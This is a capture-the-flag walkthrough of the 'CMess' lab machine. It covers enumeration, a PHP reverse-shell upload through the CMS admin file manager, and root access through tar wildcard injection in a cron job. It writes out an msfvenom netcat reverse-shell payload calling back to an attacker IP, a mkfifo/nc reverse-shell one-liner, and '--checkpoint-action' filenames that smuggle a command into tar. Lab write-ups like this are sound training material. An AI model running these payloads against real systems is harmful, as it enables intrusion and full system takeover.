# CMess

## Enumeration

to begin we are told to add the target IP to our host file 
command: ```nano /etc/hosts ```
``` <IP_address>    cmess.thm ```

now let's run an Nmap scan to discover what services are running on our target.

command: ``` nmap -sC -sV -P0 <TARGET_IP> ```

![Alt text](/posts/res/cmess1.png)

with our scan complete we can see that we have two open ports and services running on our target system.

- port 22 ***(SSH)***
- port 80 ***(HTTP)***

we navigate to the webpage. 
![Alt text](/posts/res/cmess2.png)

so from our scan since we ran we can see that it has enumerated a ***robots.txt*** file on the server with 3 disallowed entries. but after navigating manually through each of them, they provide us with a 403 forbidden message.

![Alt text](/posts/res/cmess3.png)

so from this, we can attempt to brute force for other hidden directories using Gobuster.

command: ``` gobuster dir  -u http://cmess.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt ```


![Alt text](/posts/res/cmess4.png)

from our directory brute force, we just discovered two interesting directories ***login*** and ***admin***. now we navigate to it, but it seems that we require an email address and password to authenticate. 

using our hint, we can attempt performing a sub-domain enumeration using wfuzz 

command:  ``` wfuzz -c -f sub-fighter -w /root/subdomains.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hl 125 ```


![Alt text](/posts/res/cmess5.png)

so we wait for the enumeration to complete then we can see that we have discovered a sub domain ***dev.cmess.thm***

command: ```grep 104 sub-fighter '''

![Alt text](/posts/res/cmess6.png)

now let's add that to our host file and navigate over to the site 

![Alt text](/posts/res/cmess7.png)

from the development log, we can see the login credentials we need to access the admin panel.

***email:*** ``` andre@cmess.thm ```
***password:*** ``` KPFTN_f2yxe% ```

now we Try to log in on cmess.thm/admin with these credentials

![Alt text](/posts/res/cmess8.png)

on the content tab -> File Manager, we can see an upload functionality which we can try to exploit. Try to upload reverse shell because the website is running on an Apache server PHP is very convenient for reverse shell.

![Alt text](/posts/res/cmess9.png)


so on Kali, we can find some web shells under the following directory 

``` /usr/share/webshells/php/ ```
to get this to our current working directory we can utilize the ***cp*** command to copy the files.

![Alt text](/posts/res/cmess10.png)

command: ```cp /usr/share/webshells/php/php-reverse-shell.php <CURRENT_WORKING_DIRECTORY> ```

remember to change the IP variable value with your IP and set the port number.

![Alt text](/posts/res/cmess11.png)

all uploads are stored in the assets folder. 

![Alt text](/posts/res/cmess12.png)

![Alt text](/posts/res/cmess13.png)

now to get a reverse connection once the script is executed we must set a netcat listener on our attack machine to listen and catch the request

command: ```nc -lnvp 4444 ```

![Alt text](/posts/res/cmess14.png)

to execute the reverse shell script navigate to the following path 

```http://cmess.thm/assets/<filename>```


![Alt text](/posts/res/cmess15.png)

we have successfully gotten a shell as user ***www-data***. we need to get access to escalate our privileges to the user andre so we can get the user flag.

now we can attempt to find a privilege escalation path using linpeas.sh

linpeas.sh is an automated tool for finding vulnerabilities in Linux systems.

to download Linpeas onto our machine we can use the following command 

``` wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh ```

![Alt text](/posts/res/cmess16.png)

now we would need to transfer this file to our target system by using a simple Python server from our local machine.

to do this we simply run the following command in the directory we downloaded and saved the linpeas files.

command: ``` python3 -m http.server <port_number>


![Alt text](/posts/res/cmess17.png)

Note: during a pentest, it is important to note that the file you transfer over to the target machine should always be stored in the ***/tmp*** folder to avoid the user finding them.


![Alt text](/posts/res/cmess19.png)

![Alt text](/posts/res/cmess18.png)

now we make the script executable and run it using the following command 

command: ```chmod +x linpeas.sh && ./linpeas.sh```


![Alt text](/posts/res/cmess20.png)

from linpeas enumeration, we found a bak file which is a backup file. we also found a cron job that can possibly be exploited to gain root access.



![Alt text](/posts/res/cmess21.png)

we can attempt to view the ***.password.bak*** 

command: ``` cat /opt/.password.bak```

![Alt text](/posts/res/cmess22.png)

It looks like the backup password of the andre but how we can use it? We know SSH is open on the 22 port try to sign in using this password.

command: ```ssh andre@cmess.thm ```

now we have successfully logged in as andre via the SSH credentials we found.

![Alt text](/posts/res/cmess23.png)

to get our ***user flag*** we can simply look at the file

![Alt text](/posts/res/cmess24.png)

we finally got our first flag.

## Gaining Root Access

Now we can access Andre’s folder let’s see what the cron job does that we found using Linpeas.

command: ```cat /etc/crontab ```


![Alt text](/posts/res/cmess25.png)

In this situation, a backup process occurs every 2 minutes, copying all files and folders from the /home/andre/backup directory to the /tmp directory in the form of andre_backup.tar.gz. It utilizes the tar command, and a noteworthy aspect is the use of the wildcard (*) character, signifying that anything within the /home/Andre/backup directory is included in the backup. This particular functionality may pose a security risk, as it opens the possibility of exploiting the system.

to gain a root shell we can create a payload using msfvenom

command: ``` msfvenom -p cmd/unix/reverse_netcat lhost=10.18.73.117 lport=4040 R ```

![Alt text](/posts/res/cmess26.png)

now we set up our listener 

command: ``` nc -lnvp <port> ```

Let's now echo our payload into “exploit.sh” and create the 2 directories needed for this exploit.

``` echo "mkfifo /tmp/txvij; nc 10.18.73.117 4040 0</tmp/txvij | /bin/sh >/tmp/txvij 2>&1; rm /tmp/txvij" > shell.sh ```

```echo "" > "--checkpoint-action=exec=sh shell.sh" && echo "" > --checkpoint=1 ```

![Alt text](/posts/res/cmess27.png)

Now we wait for the cron job to run and we should get tar interpret the commands and execute our shell.sh file.

and now we have our root shell and flag.

![Alt text](/posts/res/cmess28.png)




